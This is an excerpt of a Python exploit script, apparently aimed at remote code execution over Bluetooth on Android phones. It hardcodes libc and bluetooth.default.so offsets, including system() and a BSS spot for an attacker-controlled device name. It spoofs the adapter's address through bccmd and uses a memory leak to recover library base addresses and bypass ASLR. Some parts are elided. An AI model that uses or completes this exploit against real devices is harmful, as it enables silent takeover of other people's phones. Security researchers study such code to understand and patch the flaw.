...
LIBC_TEXT_STSTEM_OFFSET = 0x45f48+1# system@libc
LIBC_SOME_BLX_OFFSET = 0x1a1c1
LIBC_SO = 0xecfa3000 + LIBC_SOME_BLX_OFFSET

# Aligned to 4 inside the name on the bss (same for both supported phones)
BSS_ACL_REMOTE_NAME_OFFSET = 0x1feee4 # client name offset

# BLUETOOTH_BSS_SOME_VAR_OFFSET = BLUETOOTH - BSS_base # bluetooth.default.so
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xe3f29
BLUETOOTH = 0xe984d000 + BLUETOOTH_BSS_SOME_VAR_OFFSET
...
def set_rand_bdaddr(src_hci):
    ...
    os.system('bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
...
def find_result(leak, target):
    for idx, value in enumerate(leak):
        if target in value:
            return (idx, value.index(target))
...
def memory_leak_get_bases(src, src_hci, dst):
    ...
    x, y = find_result(result, LIBC_SO)

    likely_some_libc_blx_offset = result[x][y]

    a, b = find_result(result, BLUETOOTH)

    likely_some_bluetooth_default_global_var_offset = result[a][b]
